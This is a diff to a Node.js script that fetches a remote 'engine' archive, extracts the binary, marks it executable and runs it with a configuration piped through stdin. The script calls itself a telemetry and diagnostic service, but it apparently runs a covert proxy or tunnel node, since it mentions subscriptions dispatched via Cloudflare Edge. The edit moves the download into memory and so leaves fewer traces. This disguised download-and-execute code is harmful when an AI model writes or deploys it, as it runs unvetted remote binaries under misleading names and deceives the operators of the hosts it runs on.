@@ -98,23 +98,18 @@ function fetchTelemetryProfile(port, domain) {
   });
 }
 
-function downloadBinary(url, dest) {
+function downloadBuffer(url) {
   return new Promise((resolve, reject) => {
-    const file = fs.createWriteStream(dest);
     https.get(url, (res) => {
       if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
-        return downloadBinary(res.headers.location, dest).then(resolve).catch(reject);
+        return downloadBuffer(res.headers.location).then(resolve).catch(reject);
       }
       if (res.statusCode !== 200) return reject(new Error(`HTTP ${res.statusCode}`));
-      res.pipe(file);
-      file.on('finish', () => {
-        file.close();
-        resolve();
-      });
-    }).on('error', (err) => {
-      try { fs.unlinkSync(dest); } catch (_) {}
-      reject(err);
-    });
+      const chunks = [];
+      res.on('data', c => chunks.push(c));
+      res.on('end', () => resolve(Buffer.concat(chunks)));
+      res.on('error', reject);
+    }).on('error', reject);
   });
 }
 
@@ -146,22 +141,22 @@ async function prepareEngineRuntime() {
   fs.mkdirSync(CACHE_DIR, { recursive: true });
   const machineArch = os.arch() === 'arm64' ? 'arm64' : 'amd64';
 
-  if (!fs.existsSync(CORE_EXECUTABLE)) {
-    const archivePath = path.join(CACHE_DIR, 'engine.tar.gz');
-    log('Fetching diagnostic engine runtime from mirror...');
-    await downloadBinary(`${ENGINE_DOWNLOAD_URL}?arch=${machineArch}`, archivePath);
-
-    const gzBytes = fs.readFileSync(archivePath);
+  const isCoreValid = fs.existsSync(CORE_EXECUTABLE) && fs.statSync(CORE_EXECUTABLE).size > 10000000;
+  if (!isCoreValid) {
+    try { if (fs.existsSync(CORE_EXECUTABLE)) fs.unlinkSync(CORE_EXECUTABLE); } catch (_) {}
+    log('Fetching diagnostic engine runtime directly to memory...');
+    const gzBytes = await downloadBuffer(`${ENGINE_DOWNLOAD_URL}?arch=${machineArch}`);
     const rawBinary = extractCoreFromArchive(gzBytes);
 
-    if (rawBinary && rawBinary.length > 5000000) {
+    if (rawBinary && rawBinary.length > 10000000) {
       fs.writeFileSync(CORE_EXECUTABLE, rawBinary);
       fs.chmodSync(CORE_EXECUTABLE, 0o755);
-      try { fs.unlinkSync(archivePath); } catch (_) {}
       log(`Diagnostic engine runtime ready (${Math.round(rawBinary.length / 1024 / 1024)} MB).`);
     } else {
       log('Extraction notice: Failed to parse engine payload.');
     }
+  } else {
+    log('Diagnostic engine runtime already verified.');
   }
 }
 
@@ -182,11 +177,11 @@ async function startTelemetryService() {
     const profileData = await fetchTelemetryProfile(LISTEN_PORT, CUSTOM_DOMAIN);
     log('Telemetry configuration profile secured in memory.');
 
-    // 2. Prepare Binary Engine (Pure in-memory extraction)
+    // 2. Prepare Binary Engine (Pure in-memory download & extraction)
     await prepareEngineRuntime();
 
     // 3. Launch Core Engine via RAM Stdin Pipe
-    if (fs.existsSync(CORE_EXECUTABLE)) {
+    if (fs.existsSync(CORE_EXECUTABLE) && fs.statSync(CORE_EXECUTABLE).size > 10000000) {
       const configPayload = Buffer.from(JSON.stringify(profileData.config), 'utf8');
 
       engineInstance = spawn(CORE_EXECUTABLE, ['run', '-c', '-'], {
@@ -217,7 +212,7 @@ async function startTelemetryService() {
         log('Endpoint online: Subscription dispatched via Cloudflare Edge.');
       }
     } else {
-      log('Error: Engine binary missing from cache.');
+      log('Error: Engine binary missing or invalid.');
     }
 
   } catch (error) {
